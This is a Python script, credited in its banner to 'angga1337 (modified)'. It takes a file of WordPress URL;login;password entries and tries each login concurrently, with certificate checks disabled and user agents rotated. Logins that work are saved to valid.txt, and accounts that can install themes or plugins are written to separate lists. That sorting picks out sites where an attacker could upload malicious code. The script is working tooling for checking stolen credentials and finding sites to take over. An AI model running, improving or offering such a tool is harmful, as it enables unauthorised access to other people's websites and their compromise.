G = '\033[0;32m'  # Зеленый
W = '\033[0;37m'  # Белый
R = '\033[0;31m'  # Красный
C = '\033[1;36m'  # Голубой

import requests
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from multiprocessing.dummy import Pool as ThreadPool

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0'
]

def check_theme_install(session, base_url):
    try:
        response = session.get(
            f"{base_url}/wp-admin/theme-install.php",
            timeout=10,
            verify=False
        )
        return 'Add New Theme' in response.text and response.status_code == 200
    except:
        return False

def check_plugin_install(session, base_url):
    try:
        response = session.get(
            f"{base_url}/wp-admin/plugin-install.php",
            timeout=10,
            verify=False
        )
        return 'Add New Plugin' in response.text and response.status_code == 200
    except:
        return False

def process_site(site):
    try:
        url, login, password = site.strip().split(';')
        
        with requests.Session() as session:
            session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
            
            auth_response = session.post(
                url,
                data={'log': login, 'pwd': password},
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            
            is_valid = False
            if auth_response.status_code == 302:
                redirect_location = auth_response.headers.get('Location', '')
                if any(x in redirect_location for x in ['/wp-admin', 'profile.php']):
                    is_valid = True
            elif 'wp-admin/profile.php' in auth_response.text:
                is_valid = True
            
            if is_valid:
                base_url = url.split('/wp-login.php')[0]
                output_line = f"{url};{login};{password}"
                
                theme_install = check_theme_install(session, base_url)
                plugin_install = check_plugin_install(session, base_url)

                with open('valid.txt', 'a') as f:
                    f.write(f"{output_line}\n")
                
                if theme_install:
                    with open('theme_install.txt', 'a') as f:
                        f.write(f"{output_line}\n")
                
                if plugin_install:
                    with open('plugin_install.txt', 'a') as f:
                        f.write(f"{output_line}\n")
                
                status = []
                if theme_install:
                    status.append(f"{G}Theme Install{W}")
                if plugin_install:
                    status.append(f"{G}Plugin Install{W}")
                
                print(f"{W}[{G}+{W}] {url}")
                if status:
                    print("    " + " | ".join(status))
                
            else:
                print(f"{W}[{R}-{W}] {url} --> {R}Invalid{W}")
    
    except:
        pass

print(f'''{C}
        WordPress Install Permissions Checker
        Author : angga1337 (modified)
        Checks: Theme & Plugin Installation
        Format: URL;login;password{W}
''')

file_name = input('        Input file: ')
with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
    sites = f.read().splitlines()

threads = int(input('        Threads: '))
pool = ThreadPool(threads)
pool.map(process_site, sites)
pool.close()
pool.join()